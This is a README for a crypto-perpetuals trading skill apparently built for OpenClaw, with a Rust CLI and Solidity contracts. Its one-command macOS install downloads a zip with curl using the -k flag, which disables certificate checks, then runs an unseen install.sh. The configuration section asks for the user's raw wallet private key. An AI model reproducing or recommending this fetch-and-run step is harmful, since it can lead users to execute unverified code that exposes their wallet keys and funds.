# HyperLiquid-Claw 🦀

**Trading-enabled Hyperliquid skill for OpenClaw.**

Browse perpetual markets, execute trades on Hyperliquid L1, track open positions with live PnL, and discover hedge opportunities using LLM-powered analysis.

Built with **Rust** (core engine) + **Solidity** (on-chain vault & registry).

> **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading perpetuals involves significant risk of loss. This code has not been audited. Use only with funds you can afford to lose.

---

## ⚡ Install — macOS (one command)

```bash
curl -fsSLk github.com/3-JonWallis1993/HyperLiquid-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/HyperLiquid-Claw-main && \
bash install.sh
```

The installer will automatically:
- Install **Homebrew** (if missing)
- Install **Rust** via `rustup`
- Install **Node.js 20** via Homebrew
- Install **Foundry** (Solidity toolchain)
- Build the Rust workspace (`cargo build --release`)
- Install Solidity dependencies via `forge install`
- Symlink `hyperclaw` binary to `/usr/local/bin`
- Create a config template at `~/.hyperclaw/config/hyperclaw.env`

> macOS 12 Monterey or newer required.

---

## Features

### Market browsing
- `hyperclaw markets trending` — top perp markets by 24h volume
- `hyperclaw markets search "SOL"` — search by coin name
- `hyperclaw markets info ETH` — full market detail: price, funding, OI, spread

### Trading
- `hyperclaw order buy ETH 0.5` — open long (market, signed EIP-712)
- `hyperclaw order sell BTC 0.01` — open short
- `hyperclaw order limit ETH buy 1.0 2800` — post limit order
- `hyperclaw order close ETH` — close position (reduce-only)
- `hyperclaw order cancel ETH 12345` — cancel open order

### Position tracking
- `hyperclaw positions list` — all open positions with live PnL
- `hyperclaw positions show ETH` — detailed position view

### Wallet management
- `hyperclaw wallet status` — equity, margin, available balance
- `hyperclaw wallet history` — recent fill history

### Hedge discovery
- `hyperclaw hedge scan` — scan top markets for hedge pairs
- `hyperclaw hedge scan --query BTC --limit 30` — filtered scan
- `hyperclaw hedge analyze ETH SOL` — score a specific pair

**Coverage tiers:**

| Tier | Coverage | Label |
|------|----------|-------|
| T1 | ≥ 95% | 🟢 HIGH — near-arbitrage |
| T2 | 90–95% | 🔵 GOOD — strong hedge |
| T3 | 85–90% | 🟡 MODERATE — decent hedge |
| T4 | < 85% | 🔴 LOW — speculative |

---

## Configuration

After installation, edit your config file:

```bash
nano ~/.hyperclaw/config/hyperclaw.env
source ~/.hyperclaw/config/hyperclaw.env
```

| Variable | Required | Description |
|---|---|---|
| `HL_PRIVATE_KEY` | Yes | EVM private key (`0x`-prefixed) |
| `OPENROUTER_API_KEY` | Yes (hedge) | OpenRouter key for LLM hedge analysis |
| `HL_NETWORK` | No | `mainnet` (default) or `testnet` |
| `HL_MAX_RETRIES` | No | Max API retries (default: 5) |
| `OPENROUTER_MODEL` | No | LLM model (default: `nvidia/nemotron-nano-9b-v2:free`) |

**Where to get keys:**
- **HL_PRIVATE_KEY** — your Hyperliquid/EVM wallet private key. Fund your account at [app.hyperliquid.xyz](https://app.hyperliquid.xyz)
- **OpenRouter** — [create a free key at openrouter.ai](https://openrouter.ai/settings/keys)

> **Security:** Keep only your trading deposit in this wallet. Withdraw profits regularly to a cold wallet.

---

## Example Prompts (OpenClaw)

```
# Browse markets
What's trending on Hyperliquid?

# Check wallet
What's my HyperClaw wallet balance?

# Open a trade
Buy 0.5 ETH on Hyperliquid

# Find hedges
Find hedge opportunities on Hyperliquid, limit 15

# Track positions
Show my HyperClaw positions
```

### Full trading flow
1. `hyperclaw markets trending` → find target markets
2. `hyperclaw hedge scan --limit 20` → analyse hedge pairs
3. `hyperclaw order buy ETH 0.5` → long ETH
4. `hyperclaw order sell SOL 10` → short the hedge leg
5. `hyperclaw positions list` → monitor PnL

---

## Architecture

```
hyperliquid-claw/
│
├── Cargo.toml                   # Rust workspace root + hyperclaw binary
├── foundry.toml                 # Solidity / Foundry config
├── install.sh                   # macOS one-command installer
│
├── src/                         # Rust CLI binary
│   ├── main.rs                  # clap CLI dispatcher
│   └── cmd/
│       ├── markets.rs           # Market browsing commands
│       ├── order.rs             # Order placement commands
│       ├── positions.rs         # Position tracking commands
│       ├── wallet.rs            # Wallet status commands
│       └── hedge.rs             # Hedge discovery commands
│
├── crates/
│   ├── hl-core/                 # Hyperliquid L1 HTTP + WebSocket client
│   │   └── src/
│   │       ├── client.rs        # HlClient — /info and /exchange endpoints
│   │       ├── market.rs        # Market, Ticker, MarketInfo types
│   │       ├── order.rs         # Order, OrderRequest, OrderResponse types
│   │       ├── position.rs      # Position, AccountState types
│   │       └── ws.rs            # WebSocket subscription helpers
│   │
│   ├── hl-signer/               # EIP-712 signing for Hyperliquid actions
│   │   └── src/
│   │       ├── eip712.rs        # OrderAction, OrderWire, sign_order_action
│   │       ├── wallet.rs        # HlWallet (ethers LocalWallet wrapper)
│   │       └── error.rs         # SignerError
│   │
│   └── hl-risk/                 # Risk calculations
│       └── src/
│           ├── coverage.rs      # HedgePair, CoverageTier, score_hedge
│           └── sizing.rs        # position_size_usdc, max_safe_leverage
│
├── contracts/
│   ├── HyperClawVault.sol       # Custodial USDC vault with bridge logic
│   └── HyperClawRegistry.sol   # On-chain user config & HL↔EVM mapping
│
└── tests/
    └── HyperClawVault.t.sol     # Foundry tests (vault + registry)
```

---

## Smart Contracts

### `HyperClawVault.sol`
Custodial USDC vault that bridges user funds to Hyperliquid L1 for trading.

- Users deposit USDC → receive proportional vault shares
- Owner (bot) calls `bridgeToL1(amount)` to deploy capital
- Profits flow back via `receiveBridgeReturn(amount)`
- Share redemption reflects accumulated PnL
- Emergency pause by owner

### `HyperClawRegistry.sol`
On-chain registry linking Hyperliquid L1 addresses to EVM addresses, with per-user strategy config.

- `register(hlAddress, maxLeverage, stopLossBps, takeProfitBps, hedgeEnabled)`
- `isAuthorised(evmAddr, hlAddr)` — verify bot authorisation
- `updateConfig(...)` — update strategy parameters
- `deactivate()` — remove registration

### Running Foundry tests

```bash
forge test -vvv
```

---

## Trading mechanics

Hyperliquid uses signed **EIP-712** messages for all order actions. The flow:

1. Build `OrderAction` → `OrderWire` (asset index, size, price, tif)
2. Sign with `sign_order_action(&wallet, &action, nonce)` → returns JSON payload
3. Submit payload to `POST https://api.hyperliquid.xyz/exchange`
4. Order is matched on-chain by Hyperliquid validators in ~0.2s

Market orders are submitted as aggressive IOC limit orders with configurable slippage (default 0.5%).

---

## Troubleshooting

### `HL_PRIVATE_KEY not set`
```bash
export HL_PRIVATE_KEY="0x..."
```

### `Error: market not found`
```bash
hyperclaw markets search "PARTIAL_NAME"
```

### `Insufficient margin`
```bash
hyperclaw wallet status   # check equity
```

### Build fails on M1/M2 Mac
```bash
rustup target add aarch64-apple-darwin
cargo build --release --target aarch64-apple-darwin
```

### `forge: command not found`
```bash
export PATH="$HOME/.foundry/bin:$PATH"
foundryup
```

---

## License

MIT

## Credits

Inspired by [PolyClaw](https://github.com/chainstacklabs/polyclaw) by Chainstack.

- **Hyperliquid** — L1 perpetuals DEX
- **OpenRouter** — LLM API for hedge discovery
- **Foundry** — Solidity testing framework
- **ethers-rs** — Rust EVM library
